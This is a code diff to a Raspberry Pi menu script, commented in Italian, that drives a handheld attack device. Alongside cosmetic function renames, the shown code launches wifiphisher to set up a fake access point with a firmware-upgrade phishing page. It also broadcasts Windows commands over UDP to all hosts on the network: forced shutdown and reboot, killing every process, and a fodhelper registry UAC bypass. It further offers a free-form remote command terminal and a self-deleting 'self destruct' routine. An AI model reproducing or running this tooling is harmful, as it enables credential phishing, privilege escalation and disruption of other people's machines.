@@ -22,7 +22,7 @@ while True:
         time.sleep(0.3)
     if GPIO.input(KEY_PRESS_PIN) == 0:
         selected_option = menu_options[selected_index]
-        show_message(f"Selected: {selected_option}", 1)
+        ui_print(f"Selected: {selected_option}", 1)
 
         if selected_option == "Networks":
             # Draw and handle the Network sub-menu
@@ -44,7 +44,7 @@ while True:
                     time.sleep(0.3)
                 if GPIO.input(KEY_PRESS_PIN) == 0:
                     sub_selected_option = sub_menu_options[sub_selected_index]
-                    show_message(f"Selected: {sub_selected_option}", 1)
+                    ui_print(f"Selected: {sub_selected_option}", 1)
 
                     if sub_selected_option == "Wifi":
                         sub_menu_options = ["Fake AP", "Sniff"]
@@ -65,11 +65,11 @@ while True:
                                 time.sleep(0.3)
                             if GPIO.input(KEY_PRESS_PIN) == 0:
                                 sub_selected_option = sub_menu_options[sub_selected_index]
-                                show_message(f"Selected: {sub_selected_option}", 1)
+                                ui_print(f"Selected: {sub_selected_option}", 1)
 
                             if sub_selected_option == "Fake AP":
-                                show_message("Create a name for\n the fake AP", 3)
-                                fakeAp = get_keyboard_input()  # Prende il nome inserito dall'utente
+                                ui_print("Create a name for\n the fake AP", 3)
+                                fakeAp = getinput()  # Prende il nome inserito dall'utente
                                 # Esegui wifiphisher con il nome del fake AP
                                 command = subprocess.run(
                                     ["sudo", "wifiphisher", "-i", "wlan0", "-e", f"{fakeAp}", "-p", "firmware-upgrade"],
@@ -78,15 +78,15 @@ while True:
 
                                 # Mostra il risultato del comando
                                 if command.returncode == 0:
-                                    show_message(f"Fake AP '{fakeAp}' created successfully", 3)
+                                    ui_print(f"Fake AP '{fakeAp}' created successfully", 3)
                                 else:
-                                    show_message(f"Error: {command.stderr}", 3)
+                                    ui_print(f"Error: {command.stderr}", 3)
 
-                                show_message("Press joystick to stop", 3)
+                                ui_print("Press joystick to stop", 3)
 
                                 # Loop per aspettare che l'utente interrompa il processo
                                 while True:
-                                    show_message(command.stdout, 1)  # Mostra output in tempo reale (facoltativo)
+                                    ui_print(command.stdout, 1)  # Mostra output in tempo reale (facoltativo)
                                     if GPIO.input(KEY_UP_PIN) == 0 or GPIO.input(KEY_DOWN_PIN) == 0 or GPIO.input(KEY_PRESS_PIN) == 0:
                                         break
                             if sub_menu_options == "Sniff":
@@ -99,7 +99,7 @@ while True:
                                     capture_output=True, text=True
                                     )
                                     while True:
-                                        show_message(command.stdout, 1)
+                                        ui_print(command.stdout, 1)
                                         if GPIO.input(KEY_UP_PIN) == 0 or GPIO.input(KEY_DOWN_PIN) == 0 or GPIO.input(KEY_PRESS_PIN) == 0:
                                             break
 
@@ -126,34 +126,34 @@ while True:
                     time.sleep(0.3)
                 if GPIO.input(KEY_PRESS_PIN) == 0:
                     sub_selected_option = sub_menu_options[sub_selected_index]
-                    show_message(f"Selected: {sub_selected_option}", 1)
+                    ui_print(f"Selected: {sub_selected_option}", 1)
 
                     if sub_selected_option == "Join a Party":
-                        show_message("Select the party name", 3)
-                        partyName = get_keyboard_input()
-                        show_message("Select the password of party", 3)
-                        partyPassword = get_keyboard_input()
+                        ui_print("Select the party name", 3)
+                        partyName = getinput()
+                        ui_print("Select the password of party", 3)
+                        partyPassword = getinput()
                         # Esegui il comando usando subprocess.run per ottenere l'output
                         result = subprocess.run(["sudo", "hamachi", "join", partyName, partyPassword], capture_output=True, text=True)
-                        show_message(result.stdout, 3)
+                        ui_print(result.stdout, 3)
                         time.sleep(1)
                     elif sub_selected_option == "Create a Party":
-                        show_message("Create a party name", 3)
-                        CpartyName = get_keyboard_input()
-                        show_message("Create a password", 3)
-                        CpartyPassword = get_keyboard_input()
+                        ui_print("Create a party name", 3)
+                        CpartyName = getinput()
+                        ui_print("Create a password", 3)
+                        CpartyPassword = getinput()
                         # Esegui il comando usando subprocess.run per ottenere l'output
                         result = subprocess.run(["sudo", "hamachi", "create", CpartyName, CpartyPassword], capture_output=True, text=True)
-                        show_message(result.stdout, 3)
+                        ui_print(result.stdout, 3)
                         time.sleep(1)
                     elif sub_selected_option == "Login":
                         result = subprocess.run(["sudo", "login"], capture_output=True, text=True)
-                        show_message(result.stdout, 3)
+                        ui_print(result.stdout, 3)
                     elif sub_selected_option == "Leave Party":
-                        show_message("Write the party name\nto confirm leaving", 3)
-                        LpartyName = get_keyboard_input()
+                        ui_print("Write the party name\nto confirm leaving", 3)
+                        LpartyName = getinput()
                         result = subprocess.run(["sudo", "hamachi", "leave", LpartyName,], capture_output=True, text=True)
-                        show_message(result.stdout, 3)
+                        ui_print(result.stdout, 3)
 
 
                     break  # Exit sub-menu to main menu
@@ -180,7 +180,7 @@ while True:
                     time.sleep(0.3)
                 if GPIO.input(KEY_PRESS_PIN) == 0:
                     sub_selected_option = sub_menu_options[sub_selected_index]
-                    show_message(f"Selected: {sub_selected_option}", 1)
+                    ui_print(f"Selected: {sub_selected_option}", 1)
 
 
 
@@ -204,7 +204,7 @@ while True:
                                 time.sleep(0.3)
                             if GPIO.input(KEY_PRESS_PIN) == 0:
                                 sub_selected_option = sub_menu_options[sub_selected_index]
-                                show_message(f"ì{sub_selected_option}", 1)
+                                ui_print(f"ì{sub_selected_option}", 1)
 
                                 if sub_selected_option == "iOS":
                                     os.system("sudo python3 iphone.py")
@@ -240,7 +240,7 @@ while True:
                 sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)  # Enable broadcast
                 message = 'shutdown /s /f /t 0'
                 sock.sendto(message.encode('utf-8'), (BROADCAST_IP, PORT))
-                show_message("Command Executed", 3)
+                ui_print("Command Executed", 3)
 
             def rebootWin():
                 """Invia un messaggio di reboot a tutti gli utenti sulla rete."""
@@ -248,7 +248,7 @@ while True:
                 sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)  # Enable broadcast
                 message = 'shutdown /r /f /t 0'
                 sock.sendto(message.encode('utf-8'), (BROADCAST_IP, PORT))
-                show_message("Command Executed", 3)
+                ui_print("Command Executed", 3)
 
             def RickRoll():
                 """Invia un link di Rick Roll a tutti gli utenti sulla rete."""
@@ -256,7 +256,7 @@ while True:
                 sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)  # Enable broadcast
                 message = 'start https://www.youtube.com/watch?v=dQw4w9WgXcQ'
                 sock.sendto(message.encode('utf-8'), (BROADCAST_IP, PORT))
-                show_message("Command Executed", 3)
+                ui_print("Command Executed", 3)
 
             def KillEmAll():
                 """Invia un comando PowerShell per uccidere tutti i processi tranne explorer."""
@@ -264,7 +264,7 @@ while True:
                 sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)  # Enable broadcast
                 message = 'powershell -Command "Get-Process | Where-Object { $_.Name -ne \'explorer\' } | ForEach-Object { $_.Kill() }"'
                 sock.sendto(message.encode('utf-8'), (BROADCAST_IP, PORT))
-                show_message("Command Executed", 3)
+                ui_print("Command Executed", 3)
 
             def Crash():
                 """Invia un comando PowerShell per uccidere tutti i processi tranne explorer."""
@@ -272,7 +272,7 @@ while True:
                 sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)  # Enable broadcast
                 message = 'taskkill /F /FI "STATUS eq RUNNING"'
                 sock.sendto(message.encode('utf-8'), (BROADCAST_IP, PORT))
-                show_message("Command Executed", 3)
+                ui_print("Command Executed", 3)
 
             def UACBypass():
                   
@@ -280,30 +280,30 @@ while True:
                 sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)  # Enable broadcast
                 message = 'reg add HKCU\Software\Classes\ms-settings\shell\open\command /f /ve /t REG_SZ /d "cmd.exe" && start fodhelper.exe'
                 sock.sendto(message.encode('utf-8'), (BROADCAST_IP, PORT))
-                show_message("Command Executed", 3)
+                ui_print("Command Executed", 3)
 
 
             def Terminal():
                 """Invia un comando PowerShell per uccidere tutti i processi tranne explorer."""
                 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                 sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)  # Enable broadcast
-                show_message("Type 'Leave' for exit", 3)
+                ui_print("Type 'Leave' for exit", 3)
                 while True:
-                    message = get_keyboard_input()
+                    message = getinput()
                     if message == "Leave":
                         break
                     else:
                         sock.sendto(message.encode('utf-8'), (BROADCAST_IP, PORT))
-                        show_message("Command Executed", 1)
+                        ui_print("Command Executed", 1)
 
             def self_destruct():
                 """Rimuove il file di script."""
                 try:
                     file_path = sys.argv[0]  # Ottieni il percorso dello script corrente
                     os.remove(file_path)
-                    show_message("DESTROYED", 3)
+                    ui_print("DESTROYED", 3)
                 except Exception as e:
-                    show_message("--- ERROR --", 3)
+                    ui_print("--- ERROR --", 3)
 
             sub_menu_options = ["Shutdown", "Reboot", "RickRoll", "Kill All Process", "SELF DESTRUCTION", "UACBypass", "Cmd", "Exit"]
             sub_selected_index = 0
@@ -324,7 +324,7 @@ while True:
                     time.sleep(0.3)
                 if GPIO.input(KEY_PRESS_PIN) == 0:
                     sub_selected_option = sub_menu_options[sub_selected_index]
-                    show_message(f"Selected: {sub_selected_option}", 1)
+                    ui_print(f"Selected: {sub_selected_option}", 1)
 
                     if sub_selected_option == "Shutdown":
                         shutdownWin()
@@ -345,19 +345,19 @@ while True:
                     if sub_selected_option == "Terminal":
                         Terminal()
                     if sub_selected_option == "SELF DESTRUCTION":
-                        show_message("Type 'y' to confirm\nSELF DESTRUCTION", 3)
-                        request = get_keyboard_input()
+                        ui_print("Type 'y' to confirm\nSELF DESTRUCTION", 3)
+                        request = getinput()
                         if request == 'y':
                             self_destruct()
                             break
                         else:
-                            show_message("SELF DESTRUCTION STOPPED.", 3)
+                            ui_print("SELF DESTRUCTION STOPPED.", 3)
                             break
 
 
 
         elif selected_option == "Shutdown":
-            show_message("Shutting down...", 2)
+            ui_print("Shutting down...", 2)
             time.sleep(1)
             subprocess.call(['sudo', 'shutdown', '-h', 'now'])
         elif selected_option == "Reboot":
@@ -365,7 +365,7 @@ while True:
         elif selected_option == "Restart MojUI":
             os.system("sudo python boot.py")
         else:
-            show_message("Unknown option", 2)
+            ui_print("Unknown option", 2)
 
 
 
